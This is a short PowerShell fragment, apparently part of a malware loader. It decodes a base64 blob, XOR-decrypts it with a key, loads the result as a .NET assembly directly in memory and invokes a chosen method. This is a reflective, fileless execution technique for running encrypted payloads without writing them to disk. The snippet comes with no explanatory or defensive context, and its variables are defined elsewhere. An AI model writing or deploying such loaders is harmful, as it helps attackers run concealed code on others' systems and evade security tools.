$bytes = [Convert]::FromBase64String($blob)
for ($i=0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
}
$assembly = [Reflection.Assembly]::Load($bytes)
$method = $assembly.GetType($type).GetMethod($entry)
$method.Invoke($null, $args)
